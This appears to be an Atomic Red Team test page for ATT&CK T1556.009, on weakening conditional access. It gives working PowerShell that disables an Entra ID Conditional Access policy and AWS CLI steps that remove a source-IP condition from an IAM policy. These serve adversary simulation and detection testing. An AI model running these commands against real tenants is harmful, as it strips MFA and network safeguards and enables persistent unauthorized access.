# T1556.009 - Modify Authentication Process: Conditional Access Policies

## Description from ATT&CK

> Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.
> 
> For example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication.(Citation: Microsoft Conditional Access)(Citation: JumpCloud Conditional Access Policies)(Citation: Okta Conditional Access Policies) In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain `condition` attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested.(Citation: AWS IAM Conditions)(Citation: GCP IAM Conditions) These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required. 
> 
> By modifying conditional access policies, such as adding additional trusted IP ranges, removing [Multi-Factor Authentication](https://attack.mitre.org/techniques/T1556/006) requirements, or allowing additional [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535), adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.

### Atomic Test #1: Disable an Entra ID Conditional Access Policy via Microsoft Graph

Uses the Microsoft Graph PowerShell SDK to set an existing Entra ID Conditional Access policy to the "disabled" state, weakening authentication controls (e.g. removing an MFA or device-compliance requirement) to enable persistent access. Cleanup re-enables the policy. Requires the Microsoft.Graph.Identity.SignIns module and a delegated account with Policy.ReadWrite.ConditionalAccess.

**Supported Platforms:** Azure AD

**auto_generated_guid:** `24e514f8-863e-436a-9323-63ddcbd5d5cb`

#### Inputs

| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| policy_id | Object ID of the Conditional Access policy to disable | string | 00000000-0000-0000-0000-000000000000|

#### Attack Commands: Run with `powershell`!

```powershell
Import-Module Microsoft.Graph.Identity.SignIns
Connect-MgGraph -Scopes "Policy.ReadWrite.ConditionalAccess"
Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId "#{policy_id}" -State "disabled"
Write-Host "Conditional Access policy #{policy_id} set to disabled"
```

#### Cleanup Commands

```powershell
Update-MgIdentityConditionalAccessPolicy -ConditionalAccessPolicyId "#{policy_id}" -State "enabled" -ErrorAction Ignore
```

#### Dependencies: Run with `powershell`!

##### Description: The Microsoft.Graph.Identity.SignIns PowerShell module must be installed.

###### Check Prereq Commands

```powershell
if (Get-Module -ListAvailable -Name Microsoft.Graph.Identity.SignIns) {exit 0} else {exit 1}
```

###### Get Prereq Commands

```powershell
Install-Module Microsoft.Graph.Identity.SignIns -Force -Scope CurrentUser
```

### Atomic Test #2: Remove Source-IP Condition from an AWS IAM Policy

Simulates weakening a conditional-access-style guardrail in AWS by publishing a new default version of an IAM policy that omits the aws:SourceIp Condition, so access is no longer restricted by network location. Requires AWS CLI credentials with iam:CreatePolicyVersion.

**Supported Platforms:** AWS

**auto_generated_guid:** `1fa602ad-9a01-4e1e-b5d5-91bacc003dd5`

#### Run it with these steps! 

Using AWS CLI credentials that can modify IAM policies:
1. Inspect the target policy's default version: aws iam get-policy-version --policy-arn <policy-arn> --version-id <default-version>
2. Save the current policy document (with its "Condition" block) to original.json for restoration.
3. Create nocondition.json containing the same statements but with the "Condition" element removed.
4. Publish it as the new default: aws iam create-policy-version --policy-arn <policy-arn> --policy-document file://nocondition.json --set-as-default
5. Verify the source-IP restriction is gone from the active version.
6. Cleanup: restore the original with aws iam set-default-policy-version --policy-arn <policy-arn> --version-id <original-version>, then delete the malicious version with aws iam delete-policy-version.
